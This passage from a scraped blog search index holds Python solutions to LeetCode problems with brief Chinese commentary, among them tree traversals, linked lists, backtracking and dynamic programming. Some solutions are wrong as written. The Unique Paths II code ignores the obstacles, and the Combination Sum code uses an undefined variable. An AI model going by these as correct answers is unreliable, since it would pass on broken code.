Sol 以level為單位，當成state 這樣在解103會有好處\nclass Solution: def levelOrder(self, root: TreeNode) -\u0026gt; List[List[int]]: if not root: return [] q = deque([[root]]) ret = [] while q: now = [] rs = q.popleft() ret.append([r.val for r in rs]) for r in rs: for n in [r.left,r.right]: if n: now.append(n) if len(now) \u0026gt; 0: q.append(now) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-102-binary-tree-level-order-traversal/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習bfs\u003c/p\u003e","title":"leetcode-102 - Binary Tree Level Order Traversal"},{"content":"動機 複習Counter\nProblem Given a string s, find the first non-repeating character in it and return its index. If it does not exist, return -1.\nExample 1:\nInput: s = leetcodeOutput: 0Example 2:\nInput: s = loveleetcodeOutput: 2Example 3:\nInput: s = aabbOutput: -1 Constraints:\n1 \u003c= s.length \u003c= 105s consists of only lowercase English letters. Sol class Solution: def firstUniqChar(self, s: str) -\u0026gt; int: f = [k for (k,v) in Counter(s).items() if v == 1] if f: for i in range(len(s)): if s[i] in f: return i return -1 ","permalink":"https://littlebees.github.io/2021/07/leetcode-387-first-unique-character-in-a-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習Counter\u003c/p\u003e","title":"leetcode-387 - First Unique Character in a String"},{"content":"動機 我們不要dp了，jojo\nProblem Given an integer array nums, return the length of the longest strictly increasing subsequence.\nA subsequence is a sequence that can be derived from an array by deleting some or no elements without changing the order of the remaining elements. For example, [3,6,2,7] is a subsequence of the array [0,3,1,6,2,2,7].\nExample 1:\nInput: nums = [10,9,2,5,3,7,101,18]Output: 4Explanation: The longest increasing subsequence is [2,3,7,101], therefore the length is 4.Example 2:\nInput: nums = [0,1,0,3,2,3]Output: 4Example 3:\nInput: nums = [7,7,7,7,7,7,7]Output: 1 Constraints:\n1 \u003c= nums.length \u003c= 2500-104 \u003c= nums[i] \u003c= 104 Follow up: Can you come up with an algorithm that runs in O(n log(n)) time complexity?\nSol 讓可能的解在符合順序的情況下，數字越小越好 詳細看Longest Increasing Subsequence\nclass Solution: def lengthOfLIS(self, nums: List[int]) -\u0026gt; int: lis = [nums[0]] for n in nums[1:]: if lis[-1] \u0026lt; n: lis.append(n) else: lis[bisect_left(lis,n)] = n return len(lis) ","permalink":"https://littlebees.github.io/2021/07/leetcode-300-longest-increasing-subsequence/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e我們不要dp了，jojo\u003c/p\u003e","title":"leetcode-300 - Longest Increasing Subsequence"},{"content":"動機 醍醐灌頂!!\nProblem Given an integer array nums, move all 0's to the end of it while maintaining the relative order of the non-zero elements.\nNote that you must do this in-place without making a copy of the array.\nExample 1:\nInput: nums = [0,1,0,3,12]Output: [1,3,12,0,0]Example 2:\nInput: nums = [0]Output: [0] Constraints:\n1 \u003c= nums.length \u003c= 104-231 \u003c= nums[i] \u003c= 231 - 1 Follow up: Could you minimize the total number of operations done? Sol 簡單卻深刻，當初是先想到bubble去跑\n因為只有0，所以只要把有數字的往前提(用一個index去追蹤)，之後就是從後面開始塞0就好\nclass Solution: def moveZeroes(self, nums: List[int]) -\u0026gt; None: zeros = i = 0 for n in nums: if n == 0: zeros += 1 else: nums[i] = n i+=1 i = -1 while zeros \u0026gt; 0: nums[i] = 0 i -= 1 zeros -= 1 ","permalink":"https://littlebees.github.io/2021/07/leetcode-283-move-zeroes/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e醍醐灌頂!!\u003c/p\u003e","title":"leetcode-283 - Move Zeroes"},{"content":"動機 iteratable可以轉成set\nProblem Given two integer arrays nums1 and nums2, return an array of their intersection. Each element in the result must be unique and you may return the result in any order.\nExample 1:\nInput: nums1 = [1,2,2,1], nums2 = [2,2]Output: [2]Example 2:\nInput: nums1 = [4,9,5], nums2 = [9,4,9,8,4]Output: [9,4]Explanation: [4,9] is also accepted. Constraints:\n1 \u003c= nums1.length, nums2.length \u003c= 10000 \u003c= nums1[i], nums2[i] \u003c= 1000 Sol 都說是intersection了，就是set\nclass Solution: def intersection(self, nums1, nums2): return list(set(nums1) \u0026amp; set(nums2)) ","permalink":"https://littlebees.github.io/2021/07/leetcode-349-intersection-of-two-arrays/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eiteratable可以轉成set\u003c/p\u003e","title":"leetcode-349 - Intersection of Two Arrays"},{"content":"動機 複習dfs\nProblem Given a binary tree, find its minimum depth.\nThe minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node.\nNote: A leaf is a node with no children.\nExample 1:\nInput: root = [3,9,20,null,null,15,7]Output: 2Example 2:\nInput: root = [2,null,3,null,4,null,5,null,6]Output: 5 Constraints:\nThe number of nodes in the tree is in the range [0, 105].-1000 \u003c= Node.val \u003c= 1000 Sol def dfs(r): if r is None: return float(\u0026#39;inf\u0026#39;) elif r.left is None and r.right is None: return 1 else: return min(dfs(r.left),dfs(r.right))+1 class Solution: def minDepth(self, r: TreeNode) -\u0026gt; int: if not r: return 0 else: return dfs(r) ","permalink":"https://littlebees.github.io/2021/07/leetcode-111-minimum-depth-of-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dfs\u003c/p\u003e","title":"leetcode-111 - Minimum Depth of Binary Tree"},{"content":"動機 經典子集列舉\nProblem Given an integer array nums of unique elements, return all possible subsets (the power set).\nThe solution set must not contain duplicate subsets. Return the solution in any order.\nExample 1:\nInput: nums = [1,2,3]Output: [[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]Example 2:\nInput: nums = [0]Output: [[],[0]] Constraints:\n1 \u003c= nums.length \u003c= 10-10 \u003c= nums[i] \u003c= 10All the numbers of nums are unique. Sol class Solution: def subsets(self, nums: List[int], i = 0) -\u0026gt; List[List[int]]: if i == len(nums): return [[]] else: ret = self.subsets(nums,i+1) return ret+[tup+[nums[i]] for tup in ret] ","permalink":"https://littlebees.github.io/2021/07/leetcode-78-subsets/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e經典子集列舉\u003c/p\u003e","title":"leetcode-78 - Subsets"},{"content":"動機 經典排序列舉\nProblem Given an array nums of distinct integers, return all the possible permutations. You can return the answer in any order.\nExample 1:\nInput: nums = [1,2,3]Output: [[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]Example 2:\nInput: nums = [0,1]Output: [[0,1],[1,0]]Example 3:\nInput: nums = [1]Output: [[1]] Constraints:\n1 \u003c= nums.length \u003c= 6-10 \u003c= nums[i] \u003c= 10All the integers of nums are unique. Sol class Solution: def permute(self, nums: List[int], acc = []) -\u0026gt; List[List[int]]: if not nums: return [acc] else: return sum([self.permute(nums[:k]+nums[k+1:], acc+[nums[k]]) for k in range(len(nums))],[]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-46-permutations/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e經典排序列舉\u003c/p\u003e","title":"leetcode-46 - Permutations"},{"content":"動機 Algorithm, Leetcode-62多了石頭\nProblem A robot is located at the top-left corner of a m x n grid (marked 'Start' in the diagram below).\nThe robot can only move either down or right at any point in time. The robot is trying to reach the bottom-right corner of the grid (marked 'Finish' in the diagram below).\nNow consider if some obstacles are added to the grids. How many unique paths would there be?\nAn obstacle and space is marked as 1 and 0 respectively in the grid.\nExample 1:\nInput: obstacleGrid = [[0,0,0],[0,1,0],[0,0,0]]Output: 2Explanation: There is one obstacle in the middle of the 3x3 grid above.There are two ways to reach the bottom-right corner:1. Right -\u003e Right -\u003e Down -\u003e Down2. Down -\u003e Down -\u003e Right -\u003e RightExample 2:\nInput: obstacleGrid = [[0,1],[0,0]]Output: 1 Constraints:\nm == obstacleGrid.lengthn == obstacleGrid[i].length1 \u003c= m, n \u003c= 100obstacleGrid[i][j] is 0 or 1. Sol 把有石頭的位置當成走不到\nclass Solution: @functools.lru_cache(None) def uniquePaths(self, m: int, n: int) -\u0026gt; int: if m \u0026lt;= 0 or n \u0026lt;= 0: return 0 elif m == 1 and n == 1: return 1 else: return self.uniquePaths(m,n-1) + self.uniquePaths(m-1,n) ","permalink":"https://littlebees.github.io/2021/07/leetcode-63-unique-paths-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"/2021/07/leetcode-62\"\u003eAlgorithm, Leetcode-62\u003c/a\u003e多了石頭\u003c/p\u003e","title":"leetcode-63 - Unique Paths II"},{"content":"動機 就回文\nProblem Given a string s, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases.\nExample 1:\nInput: s = A man, a plan, a canal: PanamaOutput: trueExplanation: amanaplanacanalpanama is a palindrome.Example 2:\nInput: s = race a carOutput: falseExplanation: raceacar is not a palindrome. Constraints:\n1 \u003c= s.length \u003c= 2 * 105s consists only of printable ASCII characters. Sol 注意只要數字與字母\nclass Solution: def isPalindrome(self, s: str) -\u0026gt; bool: s = [c.lower() for c in s if c.isalpha() or c.isnumeric()] i,j = [0, len(s)-1] while i \u0026lt; j: if s[i] != s[j]: return False i,j = [i+1, j-1] return True ","permalink":"https://littlebees.github.io/2021/07/leetcode-125-valid-palindrome/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就回文\u003c/p\u003e","title":"leetcode-125 - Valid Palindrome"},{"content":"動機 複習dfs\nProblem Given an integer array nums where the elements are sorted in ascending order, convert it to a height-balanced binary search tree.\nA height-balanced binary tree is a binary tree in which the depth of the two subtrees of every node never differs by more than one.\nExample 1:\nInput: nums = [-10,-3,0,5,9]Output: [0,-3,9,-10,null,5]Explanation: [0,-10,5,null,-3,null,9] is also accepted:Example 2:\nInput: nums = [1,3]Output: [3,1]Explanation: [1,3] and [3,1] are both a height-balanced BSTs. Constraints:\n1 \u003c= nums.length \u003c= 104-104 \u003c= nums[i] \u003c= 104nums is sorted in a strictly increasing order. Sol class Solution: def sortedArrayToBST(self, nums: List[int]) -\u0026gt; TreeNode: if not nums: return None else: mid = len(nums)//2 ret = TreeNode(nums[mid]) ret.left = self.sortedArrayToBST(nums[:mid]) ret.right = self.sortedArrayToBST(nums[mid+1:]) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-108-convert-sorted-array-to-binary-search-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dfs\u003c/p\u003e","title":"leetcode-108 - Convert Sorted Array to Binary Search Tree"},{"content":"動機 寫的時候忘了這是交換\u0026hellip;\nProblem Given the root of a binary tree, invert the tree, and return its root.\nExample 1:\nInput: root = [4,2,7,1,3,6,9]Output: [4,7,2,9,6,3,1]Example 2:\nInput: root = [2,1,3]Output: [2,3,1]Example 3:\nInput: root = []Output: [] Constraints:\nThe number of nodes in the tree is in the range [0, 100].-100 \u003c= Node.val \u003c= 100 Sol 這是交換，所以要照規矩來\nclass Solution: def invertTree(self, root: TreeNode) -\u0026gt; TreeNode: if root is not None: \u0026#39;\u0026#39;\u0026#39; 最一開始居然是寫 root.left = root.right root.right = root.left 笑死 \u0026#39;\u0026#39;\u0026#39; root.left, root.right = [root.right, root.left] self.invertTree(root.right) self.invertTree(root.left) return root ","permalink":"https://littlebees.github.io/2021/07/leetcode-226-invert-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e寫的時候忘了這是交換\u0026hellip;\u003c/p\u003e","title":"leetcode-226 - Invert Binary Tree"},{"content":"動機 複習backtrack backtrack也是遞迴，所以也是看有什麼case(可以做的動作)\nProblem Given an array of distinct integers candidates and a target integer target, return a list of all unique combinations of candidates where the chosen numbers sum to target. You may return the combinations in any order.\nThe same number may be chosen from candidates an unlimited number of times. Two combinations are unique if the frequency of at least one of the chosen numbers is different.\nIt is guaranteed that the number of unique combinations that sum up to target is less than 150 combinations for the given input.\nExample 1:\nInput: candidates = [2,3,6,7], target = 7Output: [[2,2,3],[7]]Explanation:2 and 3 are candidates, and 2 + 2 + 3 = 7. Note that 2 can be used multiple times.7 is a candidate, and 7 = 7.These are the only two combinations.Example 2:\nInput: candidates = [2,3,5], target = 8Output: [[2,2,2,2],[2,3,3],[3,5]]Example 3:\nInput: candidates = [2], target = 1Output: []Example 4:\nInput: candidates = [1], target = 1Output: [[1]]Example 5:\nInput: candidates = [1], target = 2Output: [[1,1]] Constraints:\n1 \u003c= candidates.length \u003c= 301 \u003c= candidates[i] \u003c= 200All elements of candidates are distinct.1 \u003c= target \u003c= 500 Sol 一次把這個數字用完，不論是不選、選一次、選好幾次都在這層一次做完\ndef dfs(cs,t,i,tup,acc): if len(cs) \u0026lt;= i: return [tup] if t == acc else [] else: ret = dfs(cs,t,i+1,tup,acc) while t \u0026gt; acc: acc += cs[i] tmp.append(cs[i]) ret += dfs(cs,t,i+1,tmp,acc) return ret class Solution: def combinationSum(self, cs: List[int], t: int) -\u0026gt; List[List[int]]: return dfs(cs,t,0,[],0) ","permalink":"https://littlebees.github.io/2021/07/leetcode-39-combination-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習backtrack\nbacktrack也是遞迴，所以也是看有什麼case(可以做的動作)\u003c/p\u003e","title":"leetcode-39 - Combination Sum"},{"content":"動機 複習lowerbound\nProblem Given a sorted array of distinct integers and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order.\nYou must write an algorithm with O(log n) runtime complexity.\nExample 1:\nInput: nums = [1,3,5,6], target = 5Output: 2Example 2:\nInput: nums = [1,3,5,6], target = 2Output: 1Example 3:\nInput: nums = [1,3,5,6], target = 7Output: 4Example 4:\nInput: nums = [1,3,5,6], target = 0Output: 0Example 5:\nInput: nums = [1], target = 0Output: 0 Constraints:\n1 \u003c= nums.length \u003c= 104-104 \u003c= nums[i] \u003c= 104nums contains distinct values sorted in ascending order.-104 \u003c= target \u003c= 104 Sol class Solution: def searchInsert(self, ns: List[int], t: int) -\u0026gt; int: i, j = [0, len(ns)] while i \u0026lt; j: mid = i + (j-i)//2 # 如果是python可以直接寫(i+j)//2 if ns[mid] \u0026lt; t: i = mid+1 else: j = mid return i ","permalink":"https://littlebees.github.io/2021/07/leetcode-35-search-insert-position/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習lowerbound\u003c/p\u003e","title":"leetcode-35 - Search Insert Position"},{"content":"動機 複習backtrack，比起以前的commit，發現現在code越寫越短了\nProblem Given n pairs of parentheses, write a function to generate all combinations of well-formed parentheses.\nExample 1:\nInput: n = 3Output: [((())),(()()),(())(),()(()),()()()]Example 2:\nInput: n = 1Output: [()] Constraints:\n1 \u003c= n \u003c= 8 Sol 每次就是加左或是右括號，左隨時都可以加，但是右必須在有加過左時才可以加\ndef dfs(left,right,s): if left == 0: return [s + \u0026#39;)\u0026#39;*right] else: ret = dfs(left-1,right,s+\u0026#39;(\u0026#39;) if left \u0026lt; right: ret += dfs(left,right-1,s+\u0026#39;)\u0026#39;) return ret class Solution: def generateParenthesis(self, n: int) -\u0026gt; List[str]: return dfs(n,n,\u0026#34;\u0026#34;) ","permalink":"https://littlebees.github.io/2021/07/leetcode-22-generate-parentheses/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習backtrack，比起以前的commit，發現現在code越寫越短了\u003c/p\u003e","title":"leetcode-22 - Generate Parentheses"},{"content":"動機 要記得進位\nProblem You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order, and each of their nodes contains a single digit. Add the two numbers and return the sum as a linked list.\nYou may assume the two numbers do not contain any leading zero, except the number 0 itself.\nExample 1:\nInput: l1 = [2,4,3], l2 = [5,6,4]Output: [7,0,8]Explanation: 342 + 465 = 807.Example 2:\nInput: l1 = [0], l2 = [0]Output: [0]Example 3:\nInput: l1 = [9,9,9,9,9,9,9], l2 = [9,9,9,9]Output: [8,9,9,9,0,0,0,1] Constraints:\nThe number of nodes in each linked list is in the range [1, 100].0 \u003c= Node.val \u003c= 9It is guaranteed that the list represents a number that does not have leading zeros. Sol 主要就是進位，一直走下去 要注意是最後還有沒有進位，如果有要多一個node\ndef size(l): ret = 0 while l: l = l.next ret += 1 return ret class Solution: def addTwoNumbers(self, l1: ListNode, l2: ListNode) -\u0026gt; ListNode: car = 0 # premise: l1.len \u0026gt; l2.len if size(l2) \u0026gt; size(l1): l1, l2 = [l2, l1] ret = l1 prev = l1 while l1: tmp = l1.val + car + (l2.val if l2 else 0) l1.val = tmp % 10 car = tmp // 10 prev = l1 l1 = l1.next if l1 else None l2 = l2.next if l2 else None if car != 0: prev.next = ListNode(car) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-2-add-two-numbers/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e要記得進位\u003c/p\u003e","title":"leetcode-2 - Add Two Numbers"},{"content":"動機 複習dfs與交換參數的妙用\nProblem You are given two binary trees root1 and root2.\nImagine that when you put one of them to cover the other, some nodes of the two trees are overlapped while the others are not. You need to merge the two trees into a new binary tree. The merge rule is that if two nodes overlap, then sum node values up as the new value of the merged node. Otherwise, the NOT null node will be used as the node of the new tree.\nReturn the merged tree.\nNote: The merging process must start from the root nodes of both trees.\nExample 1:\nInput: root1 = [1,3,2,5], root2 = [2,1,3,null,4,null,7]Output: [3,4,5,5,4,null,7]Example 2:\nInput: root1 = [1], root2 = [1,2]Output: [2,2] Constraints:\nThe number of nodes in both trees is in the range [0, 2000].-104 \u003c= Node.val \u003c= 104 Sol 用dfs去走，不過有趣的是用交換參數來少一些程式碼\nclass Solution: def mergeTrees(self, r1: TreeNode, r2: TreeNode) -\u0026gt; TreeNode: if r1 is None and r2 is None: return None elif r1 and r2: ret = TreeNode(r1.val+r2.val) ret.left = self.mergeTrees(r1.left,r2.left) ret.right = self.mergeTrees(r1.right,r2.right) return ret elif r1: ret = TreeNode(r1.val) ret.left = self.mergeTrees(r1.left,r2) ret.right = self.mergeTrees(r1.right,r2) return ret else: return self.mergeTrees(r2,r1) ","permalink":"https://littlebees.github.io/2021/07/leetcode-617-merge-two-binary-trees/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dfs與交換參數的妙用\u003c/p\u003e","title":"leetcode-617 - Merge Two Binary Trees"},{"content":"動機 直接用23的解就ok了\nProblem Merge two sorted linked lists and return it as a sorted list. The list should be made by splicing together the nodes of the first two lists.\nExample 1:\nInput: l1 = [1,2,4], l2 = [1,3,4]Output: [1,1,2,3,4,4]Example 2:\nInput: l1 = [], l2 = []Output: []Example 3:\nInput: l1 = [], l2 = [0]Output: [0] Constraints:\nThe number of nodes in both lists is in the range [0, 50].-100 \u003c= Node.val \u003c= 100Both l1 and l2 are sorted in non-decreasing order. Sol class Solution: def mergeKLists(self, lists: List[ListNode]) -\u0026gt; ListNode: lists = [x for x in lists if x] ret = cur = ListNode() while lists: tmp = min(enumerate(lists), key=lambda x: x[1].val) cur.next = tmp[1] cur = cur.next if lists[tmp[0]].next is None: del lists[tmp[0]] else: lists[tmp[0]] = lists[tmp[0]].next return ret.next def mergeTwoLists(self, l1: ListNode, l2: ListNode) -\u0026gt; ListNode: return self.mergeKLists([l1,l2]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-21-merge-two-sorted-lists/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e直接用\u003ca href=\"/2021/07/leetcode-23\"\u003e23\u003c/a\u003e的解就ok了\u003c/p\u003e","title":"leetcode-21 - Merge Two Sorted Lists"},{"content":"動機 複習linked list的reverse\nProblem Given the head of a singly linked list, reverse the list, and return the reversed list.\nExample 1:\nInput: head = [1,2,3,4,5]Output: [5,4,3,2,1]Example 2:\nInput: head = [1,2]Output: [2,1]Example 3:\nInput: head = []Output: [] Constraints:\nThe number of nodes in the list is the range [0, 5000].-5000 \u003c= Node.val \u003c= 5000 Follow up: A linked list can be reversed either iteratively or recursively. Could you implement both?\nSol 寫iterative版的reverse感覺很像在寫rotate image之類的題目，都要把不同區段用變數列出來，之後在loop中保持他們的狀態\nclass Solution: def reverseList(self, head: ListNode) -\u0026gt; ListNode: if head is None: return None elif head.next is None: return head else: now = head.next prev = head nextNow = head.next last = prev while now: nextNow = nextNow.next now.next = prev prev = now now = nextNow last.next = None return prev ","permalink":"https://littlebees.github.io/2021/07/leetcode-206-reverse-linked-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習linked list的reverse\u003c/p\u003e","title":"leetcode-206 - Reverse Linked List"},{"content":"動機 複習判圈與找loop起點\nProblem Given a linked list, return the node where the cycle begins. If there is no cycle, return null.\nThere is a cycle in a linked list if there is some node in the list that can be reached again by continuously following the next pointer. Internally, pos is used to denote the index of the node that tail's next pointer is connected to. Note that pos is not passed as a parameter.\nNotice that you should not modify the linked list.\nExample 1:\nInput: head = [3,2,0,-4], pos = 1Output: tail connects to node index 1Explanation: There is a cycle in the linked list, where tail connects to the second node.Example 2:\nInput: head = [1,2], pos = 0Output: tail connects to node index 0Explanation: There is a cycle in the linked list, where tail connects to the first node.Example 3:\nInput: head = [1], pos = -1Output: no cycleExplanation: There is no cycle in the linked list. Constraints:\nThe number of the nodes in the list is in the range [0, 104].-105 \u003c= Node.val \u003c= 105pos is -1 or a valid index in the linked-list. Follow up: Can you solve it using O(1) (i.e. constant) memory?\nSol 要記的把b的條件寫好，不然會在[1,2],-1的case掛掉誤以為有loop\nclass Solution: def detectCycle(self, head: ListNode) -\u0026gt; ListNode: if head is None: return None a = head b = head while b and b.next and b.next.next: a = a.next b = b.next.next if a is b: break if a is b and b and b.next and b.next.next: a = head while a is not b: a = a.next b = b.next return a else: return None ","permalink":"https://littlebees.github.io/2021/07/leetcode-142-linked-list-cycle-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習判圈與找loop起點\u003c/p\u003e","title":"leetcode-142 - Linked List Cycle II"},{"content":"動機 複習快速pow\nProblem Implement pow(x, n), which calculates x raised to the power n (i.e., xn).\nExample 1:\nInput: x = 2.00000, n = 10Output: 1024.00000Example 2:\nInput: x = 2.10000, n = 3Output: 9.26100Example 3:\nInput: x = 2.00000, n = -2Output: 0.25000Explanation: 2-2 = 1/22 = 1/4 = 0.25 Constraints:\n-100.0 \u003c x \u003c 100.0-231 \u003c= n \u003c= 231-1-104 \u003c= xn \u003c= 104 Sol def dp(x,n): if n == 0: return 1 elif n == 1: return x else: if n % 2 == 0: half = dp(x,n//2) return half*half else: return dp(x,n-1)*x class Solution: def myPow(self, x: float, n: int) -\u0026gt; float: ret = dp(x,abs(n)) return 1/ret if n \u0026lt; 0 else ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-50-powx-n/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習快速pow\u003c/p\u003e","title":"leetcode-50 - Pow(x, n)"},{"content":"動機 複習dfs\nProblem Given the root of a binary tree and an integer targetSum, return true if the tree has a root-to-leaf path such that adding up all the values along the path equals targetSum.\nA leaf is a node with no children.\nExample 1:\nInput: root = [5,4,8,11,null,13,4,7,2,null,null,null,1], targetSum = 22Output: trueExample 2:\nInput: root = [1,2,3], targetSum = 5Output: falseExample 3:\nInput: root = [1,2], targetSum = 0Output: false Constraints:\nThe number of nodes in the tree is in the range [0, 5000].-1000 \u003c= Node.val \u003c= 1000-1000 \u003c= targetSum \u003c= 1000 Sol 注意到是root到leaf!!\ndef dfs(r,target,cnt): if r is None: return False elif r.val+cnt == target and not r.left and not r.right: return True else: return dfs(r.left,target,cnt+r.val) or dfs(r.right,target,cnt+r.val) class Solution: def hasPathSum(self, r: TreeNode, targetSum: int) -\u0026gt; bool: return dfs(r,targetSum,0) ","permalink":"https://littlebees.github.io/2021/07/leetcode-112-path-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dfs\u003c/p\u003e","title":"leetcode-112 - Path Sum"},{"content":"動機 複習dfs\nProblem Given the root of a binary tree, return its maximum depth.\nA binary tree's maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.\nExample 1:\nInput: root = [3,9,20,null,null,15,7]Output: 3Example 2:\nInput: root = [1,null,2]Output: 2Example 3:\nInput: root = []Output: 0Example 4:\nInput: root = [0]Output: 1 Constraints:\nThe number of nodes in the tree is in the range [0, 104].-100 \u003c= Node.val \u003c= 100 Sol class Solution: def maxDepth(self, root): \u0026#34;\u0026#34;\u0026#34; :type root: TreeNode :rtype: int \u0026#34;\u0026#34;\u0026#34; if not root: return 0 elif not root.left and not root.right: return 1 else: return 1+max([self.maxDepth(root.left),self.maxDepth(root.right)]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-104-maximum-depth-of-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dfs\u003c/p\u003e","title":"leetcode-104 - Maximum Depth of Binary Tree"},{"content":"動機 複習sliding windows\nProblem Given a string s, find the length of the longest substring without repeating characters.\nExample 1:\nInput: s = abcabcbbOutput: 3Explanation: The answer is abc, with the length of 3.Example 2:\nInput: s = bbbbbOutput: 1Explanation: The answer is b, with the length of 1.Example 3:\nInput: s = pwwkewOutput: 3Explanation: The answer is wke, with the length of 3.Notice that the answer must be a substring, pwke is a subsequence and not a substring.Example 4:\nInput: s = Output: 0 Constraints:\n0 \u003c= s.length \u003c= 5 * 104s consists of English letters, digits, symbols and spaces. Sol sliding windows用set去追蹤windows的內容物\nclass Solution: def lengthOfLongestSubstring(self, s: str) -\u0026gt; int: ss = set() a = 0; b = 0 ans = 0 while a \u0026lt; len(s) and b \u0026lt; len(s): if s[b] not in ss: ss.add(s[b]) ans = max(ans,b-a+1) b+=1 else: ss.remove(s[a]) a+=1 return ans ","permalink":"https://littlebees.github.io/2021/07/leetcode-3-longest-substring-without-repeating-characters/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習sliding windows\u003c/p\u003e","title":"leetcode-3 - Longest Substring Without Repeating Characters"},{"content":"動機 這題為什麼是hard?\nProblem You are given an array of k linked-lists lists, each linked-list is sorted in ascending order.\nMerge all the linked-lists into one sorted linked-list and return it.\nExample 1:\nInput: lists = [[1,4,5],[1,3,4],[2,6]]Output: [1,1,2,3,4,4,5,6]Explanation: The linked-lists are:[ 1-\u003e4-\u003e5, 1-\u003e3-\u003e4, 2-\u003e6]merging them into one sorted list:1-\u003e1-\u003e2-\u003e3-\u003e4-\u003e4-\u003e5-\u003e6Example 2:\nInput: lists = []Output: []Example 3:\nInput: lists = [[]]Output: [] Constraints:\nk == lists.length0 \u003c= k \u003c= 10^40 \u003c= lists[i].length \u003c= 500-10^4 \u003c= lists[i][j] \u003c= 10^4lists[i] is sorted in ascending order.The sum of lists[i].length won't exceed 10^4. Sol 直接硬幹就好，如果不計較速度的話\nclass Solution: def mergeKLists(self, lists: List[ListNode]) -\u0026gt; ListNode: lists = [x for x in lists if x] ret = cur = ListNode() while lists: tmp = min(enumerate(lists), key=lambda x: x[1].val) cur.next = tmp[1] cur = cur.next if lists[tmp[0]].next is None: del lists[tmp[0]] else: lists[tmp[0]] = lists[tmp[0]].next return ret.next ","permalink":"https://littlebees.github.io/2021/07/leetcode-23-merge-k-sorted-lists/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題為什麼是hard?\u003c/p\u003e","title":"leetcode-23 - Merge k Sorted Lists"},{"content":"動機 複習dp\nProblem You are given an integer array coins representing coins of different denominations and an integer amount representing a total amount of money.\nReturn the fewest number of coins that you need to make up that amount. If that amount of money cannot be made up by any combination of the coins, return -1.\nYou may assume that you have an infinite number of each kind of coin.\nExample 1:\nInput: coins = [1,2,5], amount = 11Output: 3Explanation: 11 = 5 + 5 + 1Example 2:\nInput: coins = [2], amount = 3Output: -1Example 3:\nInput: coins = [1], amount = 0Output: 0Example 4:\nInput: coins = [1], amount = 1Output: 1Example 5:\nInput: coins = [1], amount = 2Output: 2 Constraints:\n1 \u003c= coins.length \u003c= 121 \u003c= coins[i] \u003c= 231 - 10 \u003c= amount \u003c= 104 Sol 下面多了i就做了無用功，就變慢了\nclass Solution: @functools.lru_cache(None) def dp(self,cnt,i): if cnt == 0: return 0 elif cnt \u0026lt; 0 or i \u0026lt; 0: return float(\u0026#39;inf\u0026#39;) else: ret = float(\u0026#39;inf\u0026#39;) for x in reversed(range(i)): ret = min(ret, self.dp(cnt-self.cs[x],x+1)) return ret+1 def coinChange(self, coins: List[int], amount: int) -\u0026gt; int: self.cs = coins self.cnt = amount self.ret = float(\u0026#39;inf\u0026#39;) self.cs.sort() ans = self.dp(amount,len(coins)) return ans if ans != float(\u0026#39;inf\u0026#39;) else -1 只要總和做維度就好\u0026hellip;\nclass Solution: @functools.lru_cache(None) def dp(self,cnt): if cnt == 0: return 0 elif cnt \u0026lt; 0: return float(\u0026#39;inf\u0026#39;) else: ret = float(\u0026#39;inf\u0026#39;) for x in self.cs: ret = min(ret, self.dp(cnt-x)) return ret+1 def coinChange(self, coins: List[int], amount: int) -\u0026gt; int: self.cs = coins self.cnt = amount self.ret = float(\u0026#39;inf\u0026#39;) self.cs.sort(reverse=True) ans = self.dp(amount) return ans if ans != float(\u0026#39;inf\u0026#39;) else -1 ","permalink":"https://littlebees.github.io/2021/07/leetcode-322-coin-change/","summary":"\u003ch2 